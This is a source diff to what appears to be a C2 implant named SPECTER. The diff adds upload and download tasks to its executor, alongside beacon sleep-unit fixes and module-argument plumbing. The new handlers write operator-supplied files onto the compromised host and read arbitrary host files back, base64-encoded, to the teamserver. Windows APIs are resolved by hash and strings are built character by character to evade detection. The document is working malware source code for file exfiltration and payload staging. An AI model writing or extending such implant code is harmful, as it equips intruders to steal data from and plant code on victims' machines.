@@ -15,12 +15,25 @@
 #include "task_exec.h"
 #include "heap.h"
 #include "bus.h"
+#include "util.h"
+
+#define INVALID_HANDLE_VALUE_LOCAL ((HANDLE)(QWORD)-1)
+#define GENERIC_READ_LOCAL          0x80000000UL
+#define GENERIC_WRITE_LOCAL         0x40000000UL
+#define FILE_SHARE_READ_LOCAL       0x00000001UL
+#define FILE_SHARE_WRITE_LOCAL      0x00000002UL
+#define OPEN_EXISTING_LOCAL         3UL
+#define CREATE_ALWAYS_LOCAL         2UL
+#define FILE_ATTRIBUTE_NORMAL_LOCAL 0x00000080UL
+
+static void store_task_failed_text(IMPLANT_CONTEXT *ctx, const char *task_id,
+                                   const char *text, DWORD text_len);
 
 /* ------------------------------------------------------------------ */
 /*  Dev build trace support                                            */
 /* ------------------------------------------------------------------ */
 
-#ifdef SPECTER_DEV_BUILD
+#if defined(SPECTER_DEV_BUILD) && !defined(SPECTER_BAREBONE_MODULES)
 static void task_dev_trace(const char *msg) {
     typedef void (__attribute__((ms_abi)) *fn_Dbg)(const char *);
     PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
@@ -69,6 +82,8 @@ DWORD parse_task_type(const char *type_str, DWORD len) {
     /* Legacy inline tasks */
     char s_shell[]       = {'s','h','e','l','l',0};
     char s_cmd[]         = {'c','m','d',0};
+    char s_upload[]      = {'u','p','l','o','a','d',0};
+    char s_download[]    = {'d','o','w','n','l','o','a','d',0};
 
     /* Module bus tasks */
     char s_module_load[] = {'m','o','d','u','l','e','_','l','o','a','d',0};
@@ -85,6 +100,8 @@ DWORD parse_task_type(const char *type_str, DWORD len) {
     /* Legacy inline */
     if (streq_n(type_str, len, s_shell))       return TASK_TYPE_CMD;
     if (streq_n(type_str, len, s_cmd))         return TASK_TYPE_CMD;
+    if (streq_n(type_str, len, s_upload))      return TASK_TYPE_UPLOAD;
+    if (streq_n(type_str, len, s_download))    return TASK_TYPE_DOWNLOAD;
 
     /* Module bus */
     if (streq_n(type_str, len, s_module_load)) return TASK_TYPE_MODULE;
@@ -342,7 +359,8 @@ static void handle_sleep_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     }
 
     if (is_ascii && interval > 0) {
-        cfg->sleep_interval = interval;
+        /* Operator / C2 send seconds; IMPLANT_CONFIG stores milliseconds */
+        cfg->sleep_interval = interval * 1000;
         if (jitter > 0 && jitter <= 100)
             cfg->jitter_percent = jitter;
     } else if (task->data_len >= 4) {
@@ -352,12 +370,12 @@ static void handle_sleep_task(IMPLANT_CONTEXT *ctx, TASK *task) {
                    ((DWORD)task->data[2] << 16) |
                    ((DWORD)task->data[3] << 24);
         if (interval > 0)
-            cfg->sleep_interval = interval;
+            cfg->sleep_interval = interval * 1000;
         if (task->data_len >= 5)
             cfg->jitter_percent = (DWORD)task->data[4];
     }
 
-    /* Build result string: "interval=30s jitter=15%" */
+    /* Build result string: "interval=30s jitter=15%" (seconds for teamserver / UI) */
     {
         char result[64];
         DWORD rpos = 0;
@@ -367,7 +385,7 @@ static void handle_sleep_task(IMPLANT_CONTEXT *ctx, TASK *task) {
         /* Convert interval to string */
         char num[12];
         DWORD nlen = 0;
-        DWORD val = cfg->sleep_interval;
+        DWORD val = cfg->sleep_interval / 1000;
         if (val == 0) { num[nlen++] = '0'; }
         else { char tmp[12]; DWORD tlen = 0; while (val > 0) { tmp[tlen++] = '0' + (val % 10); val /= 10; } for (DWORD k = tlen; k > 0; k--) num[nlen++] = tmp[k-1]; }
         for (DWORD k = 0; k < nlen; k++) result[rpos++] = num[k];
@@ -383,7 +401,13 @@ static void handle_sleep_task(IMPLANT_CONTEXT *ctx, TASK *task) {
         for (DWORD k = 0; k < nlen; k++) result[rpos++] = num[k];
         result[rpos++] = '%';
         result[rpos] = 0;
-        store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, (BYTE*)result, rpos);
+        BYTE *out = (BYTE *)task_alloc(rpos);
+        if (!out) {
+            store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+            return;
+        }
+        spec_memcpy(out, result, rpos);
+        store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, out, rpos);
     }
 }
 
@@ -479,6 +503,15 @@ static void handle_pwd_task(IMPLANT_CONTEXT *ctx, TASK *task) {
  * completion, then drain output into a task result.
  */
 static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
+#if defined(SPECTER_BAREBONE) && !defined(SPECTER_BAREBONE_MODULES)
+    char unsupported[] = {
+        'm','o','d','u','l','e',' ','b','u','s',' ','d','i','s','a','b','l','e','d',' ',
+        'i','n',' ','b','a','r','e','b','o','n','e',' ','b','u','i','l','d',0
+    };
+    store_task_failed_text(ctx, task->task_id, unsupported,
+                           (DWORD)(sizeof(unsupported) - 1));
+#else
+    TASK_TRACE("[SPECTER] execute_module_task: enter");
     if (!task->data || task->data_len == 0) {
         TASK_TRACE("[SPECTER] execute_module_task: no data");
         store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
@@ -512,6 +545,7 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
      * the start, so we can compute the expected package size from the
      * header's encrypted_size field. */
     const MODULE_PACKAGE_HDR *hdr = loader_parse_header(package, package_len);
+    TASK_TRACE("[SPECTER] execute_module_task: header parsed");
     if (!hdr) {
         TASK_TRACE("[SPECTER] execute_module_task: invalid package header");
         store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
@@ -526,8 +560,18 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
         return;
     }
 
+    const BYTE *module_args = NULL;
+    DWORD module_args_len = 0;
+    if (package_len > actual_pkg_len && package[actual_pkg_len] == 0) {
+        module_args = package + actual_pkg_len + 1;
+        module_args_len = package_len - actual_pkg_len - 1;
+    }
+
+    TASK_TRACE("[SPECTER] execute_module_task: modmgr_execute begin");
     /* Execute via modmgr — this handles verify, decrypt, load, guardian */
-    int slot = modmgr_execute(mgr, package, actual_pkg_len);
+    int slot = modmgr_execute(mgr, package, actual_pkg_len,
+                              module_args, module_args_len);
+    TASK_TRACE("[SPECTER] execute_module_task: modmgr_execute returned");
 
     if (slot < 0) {
         TASK_TRACE("[SPECTER] execute_module_task: modmgr_execute failed");
@@ -541,11 +585,19 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
     LOADED_MODULE *mod = &mgr->slots[slot];
     guardian_wait(mod, GUARDIAN_DEFAULT_TIMEOUT);
 
-    /* Drain output from the module's output ring */
-    BYTE output_buf[TASK_OUTPUT_MAX];
+    /* Drain output from the module's output ring. Keep the large scratch
+     * buffer off the beacon stack; TASK_OUTPUT_MAX is intentionally large. */
+    BYTE *output_buf = NULL;
     DWORD drained = 0;
 
     if (mod->output_ring) {
+        output_buf = (BYTE *)task_alloc(TASK_OUTPUT_MAX);
+        if (!output_buf) {
+            guardian_kill(mod);
+            modmgr_cleanup(mgr, (DWORD)slot);
+            store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+            return;
+        }
         drained = output_drain(mod->output_ring, output_buf, TASK_OUTPUT_MAX);
     }
 
@@ -573,10 +625,245 @@ static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
         store_task_result(ctx, task->task_id, result_status, NULL, 0);
     }
 
+    if (output_buf) {
+        task_free(output_buf);
+    }
+
     /* Clean up the module slot */
     modmgr_cleanup(mgr, (DWORD)slot);
 
     TASK_TRACE("[SPECTER] execute_module_task: done");
+#endif
+}
+
+/* Match download cap — decoded upload payload must not exceed this */
+#define TASK_FILE_TRANSFER_CAP (1024u * 1024u)
+/* CreateFileA path buffer is MAX_PATH including NUL — reject longer remote paths */
+#define TASK_MAX_PATH_CHARS 259u
+
+static void store_task_failed_text(IMPLANT_CONTEXT *ctx, const char *task_id,
+                                   const char *text, DWORD text_len) {
+    BYTE *buf = (BYTE *)task_alloc(text_len);
+    if (!buf) {
+        store_task_result(ctx, task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+    spec_memcpy(buf, text, text_len);
+    store_task_result(ctx, task_id, TASK_STATUS_FAILED, buf, text_len);
+}
+
+static BOOL task_b64_decode(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_max, DWORD *out_len) {
+    if (!in || !out || !out_len) return FALSE;
+    if ((in_len % 4u) != 0u) return FALSE;
+    DWORD oi = 0, i = 0;
+    while (i + 3 < in_len) {
+        int a = util_b64_decode_char((char)in[i]);
+        int b = util_b64_decode_char((char)in[i + 1]);
+        int c = util_b64_decode_char((char)in[i + 2]);
+        int d = util_b64_decode_char((char)in[i + 3]);
+        if (a < 0 || b < 0) return FALSE;
+        if (oi + 1 > out_max) return FALSE;
+        out[oi++] = (BYTE)((a << 2) | (b >> 4));
+        if (in[i + 2] != '=') {
+            if (c < 0 || oi + 1 > out_max) return FALSE;
+            out[oi++] = (BYTE)(((b & 0x0F) << 4) | (c >> 2));
+        }
+        if (in[i + 3] != '=') {
+            if (d < 0 || oi + 1 > out_max) return FALSE;
+            out[oi++] = (BYTE)(((c & 0x03) << 6) | d);
+        }
+        i += 4;
+    }
+    *out_len = oi;
+    return TRUE;
+}
+
+static DWORD task_b64_encode(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_max) {
+    DWORD i = 0, oi = 0;
+    while (i + 3 <= in_len) {
+        DWORD v = ((DWORD)in[i] << 16) | ((DWORD)in[i + 1] << 8) | (DWORD)in[i + 2];
+        if (oi + 4 > out_max) return 0;
+        out[oi++] = (BYTE)util_b64_table[(v >> 18) & 0x3F];
+        out[oi++] = (BYTE)util_b64_table[(v >> 12) & 0x3F];
+        out[oi++] = (BYTE)util_b64_table[(v >> 6) & 0x3F];
+        out[oi++] = (BYTE)util_b64_table[v & 0x3F];
+        i += 3;
+    }
+    if (i < in_len) {
+        DWORD rem = in_len - i;
+        DWORD v = ((DWORD)in[i] << 16) | ((rem > 1 ? (DWORD)in[i + 1] : 0) << 8);
+        if (oi + 4 > out_max) return 0;
+        out[oi++] = (BYTE)util_b64_table[(v >> 18) & 0x3F];
+        out[oi++] = (BYTE)util_b64_table[(v >> 12) & 0x3F];
+        out[oi++] = (rem > 1) ? (BYTE)util_b64_table[(v >> 6) & 0x3F] : '=';
+        out[oi++] = '=';
+    }
+    return oi;
+}
+
+/* upload args format: "<remote_path>\\n<base64_data>" */
+static void handle_upload_task(IMPLANT_CONTEXT *ctx, TASK *task) {
+    if (!task->data || task->data_len == 0) {
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+
+    DWORD sep = 0;
+    while (sep < task->data_len && task->data[sep] != '\n') sep++;
+    if (sep == 0 || sep >= task->data_len - 1) {
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+    if (sep > TASK_MAX_PATH_CHARS) {
+        store_task_failed_text(ctx, task->task_id, "remote path too long", 20);
+        return;
+    }
+
+    char path[260];
+    DWORD path_len = sep;
+    spec_memcpy(path, task->data, path_len);
+    path[path_len] = 0;
+
+    const BYTE *b64 = task->data + sep + 1;
+    DWORD b64_len = task->data_len - sep - 1;
+    DWORD alloc_size = (b64_len / 4) * 3 + 8;
+    BYTE *decoded = (BYTE *)task_alloc(alloc_size);
+    if (!decoded) {
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+
+    DWORD decoded_len = 0;
+    if (!task_b64_decode(b64, b64_len, decoded, alloc_size, &decoded_len)) {
+        task_free(decoded);
+        store_task_failed_text(ctx, task->task_id, "invalid base64", 14);
+        return;
+    }
+    if (decoded_len > TASK_FILE_TRANSFER_CAP) {
+        task_free(decoded);
+        store_task_failed_text(ctx, task->task_id, "file larger than 1 MiB", 22);
+        return;
+    }
+
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    fn_CreateFileA pCreateFile = k32 ? (fn_CreateFileA)find_export_by_hash(k32, HASH_CREATEFILEA) : NULL;
+    fn_WriteFile pWriteFile = k32 ? (fn_WriteFile)find_export_by_hash(k32, HASH_WRITEFILE) : NULL;
+    fn_CloseHandle pClose = k32 ? (fn_CloseHandle)find_export_by_hash(k32, HASH_CLOSEHANDLE) : NULL;
+    if (!pCreateFile || !pWriteFile || !pClose) {
+        task_free(decoded);
+        store_task_failed_text(ctx, task->task_id, "resolve API failed", 18);
+        return;
+    }
+
+    HANDLE h = pCreateFile(path, GENERIC_WRITE_LOCAL, FILE_SHARE_READ_LOCAL,
+                           NULL, CREATE_ALWAYS_LOCAL, FILE_ATTRIBUTE_NORMAL_LOCAL, NULL);
+    if (h == INVALID_HANDLE_VALUE_LOCAL) {
+        task_free(decoded);
+        store_task_failed_text(ctx, task->task_id, "cannot create file", 18);
+        return;
+    }
+
+    DWORD written = 0;
+    BOOL ok = pWriteFile(h, decoded, decoded_len, &written, NULL);
+    pClose(h);
+    task_free(decoded);
+    if (!ok || written != decoded_len) {
+        store_task_failed_text(ctx, task->task_id, "write failed", 12);
+        return;
+    }
+
+    /* Heap-copy message — store_task_result owns pointer; task_free_results frees it */
+    char msg[] = {'u','p','l','o','a','d',' ','o','k'};
+    BYTE *out = (BYTE *)task_alloc((DWORD)sizeof(msg));
+    if (!out) {
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+    spec_memcpy(out, msg, sizeof(msg));
+    store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, out, (DWORD)sizeof(msg));
+}
+
+/* download args format: "<remote_path>" ; result data is base64 file bytes */
+static void handle_download_task(IMPLANT_CONTEXT *ctx, TASK *task) {
+    if (!task->data || task->data_len == 0) {
+        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
+        return;
+    }
+    if (task->data_len > TASK_MAX_PATH_CHARS) {
+        store_task_failed_text(ctx, task->task_id, "remote path too long", 20);
+        return;
+    }
+
+    char path[260];
+    DWORD path_len = task->data_len;
+    spec_memcpy(path, task->data, path_len);
+    path[path_len] = 0;
+
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    fn_CreateFileA pCreateFile = k32 ? (fn_CreateFileA)find_export_by_hash(k32, HASH_CREATEFILEA) : NULL;
+    fn_GetFileSize pGetSize = k32 ? (fn_GetFileSize)find_export_by_hash(k32, HASH_GETFILESIZE) : NULL;
+    fn_ReadFile pReadFile = k32 ? (fn_ReadFile)find_export_by_hash(k32, HASH_READFILE) : NULL;
+    fn_CloseHandle pClose = k32 ? (fn_CloseHandle)find_export_by_hash(k32, HASH_CLOSEHANDLE) : NULL;
+    if (!pCreateFile || !pGetSize || !pReadFile || !pClose) {
+        store_task_failed_text(ctx, task->task_id, "resolve API failed", 18);
+        return;
+    }
+
+    HANDLE h = pCreateFile(path, GENERIC_READ_LOCAL, FILE_SHARE_READ_LOCAL | FILE_SHARE_WRITE_LOCAL,
+                           NULL, OPEN_EXISTING_LOCAL, FILE_ATTRIBUTE_NORMAL_LOCAL, NULL);
+    if (h == INVALID_HANDLE_VALUE_LOCAL) {
+        store_task_failed_text(ctx, task->task_id, "cannot open file", 16);
+        return;
+    }
+
+    DWORD hi = 0;
+    DWORD size = pGetSize(h, &hi);
+    if (hi != 0) {
+        pClose(h);
+        store_task_failed_text(ctx, task->task_id, "file too large", 14);
+        return;
+    }
+    if (size == 0 || size == 0xFFFFFFFF) {
+        pClose(h);
+        store_task_failed_text(ctx, task->task_id, "empty or unreadable file", 24);
+        return;
+    }
+    if (size > TASK_FILE_TRANSFER_CAP) {
+        pClose(h);
+        store_task_failed_text(ctx, task->task_id, "file larger than 1 MiB", 22);
+        return;
+    }
+
+    BYTE *raw = (BYTE *)task_alloc(size);
+    if (!raw) {
+        pClose(h);
+        store_task_failed_text(ctx, task->task_id, "out of memory", 13);
+        return;
+    }
+    DWORD read = 0;
+    BOOL ok = pReadFile(h, raw, size, &read, NULL);
+    pClose(h);
+    if (!ok || read != size) {
+        task_free(raw);
+        store_task_failed_text(ctx, task->task_id, "read failed", 11);
+        return;
+    }
+
+    DWORD out_max = ((size + 2) / 3) * 4 + 8;
+    BYTE *b64 = (BYTE *)task_alloc(out_max);
+    if (!b64) {
+        task_free(raw);
+        store_task_failed_text(ctx, task->task_id, "out of memory", 13);
+        return;
+    }
+    DWORD out_len = task_b64_encode(raw, size, b64, out_max);
+    task_free(raw);
+    if (out_len == 0) {
+        task_free(b64);
+        store_task_failed_text(ctx, task->task_id, "base64 encode failed", 20);
+        return;
+    }
+    store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, b64, out_len);
 }
 
 /* ------------------------------------------------------------------ */
@@ -610,6 +897,14 @@ void execute_task(IMPLANT_CONTEXT *ctx, TASK *task) {
         task_cmd_exec(ctx, task);
         break;
 
+    case TASK_TYPE_UPLOAD:
+        handle_upload_task(ctx, task);
+        break;
+
+    case TASK_TYPE_DOWNLOAD:
+        handle_download_task(ctx, task);
+        break;
+
     /* ---- Module bus tasks ---- */
     case TASK_TYPE_MODULE:
     case TASK_TYPE_BOF:
@@ -617,8 +912,7 @@ void execute_task(IMPLANT_CONTEXT *ctx, TASK *task) {
         break;
 
     default:
-        /* Unknown or unimplemented task type — report failure.
-           Shellcode, upload, and download are handled via modules (bus). */
+        /* Unknown or unimplemented task type — report failure. */
         store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
         break;
     }
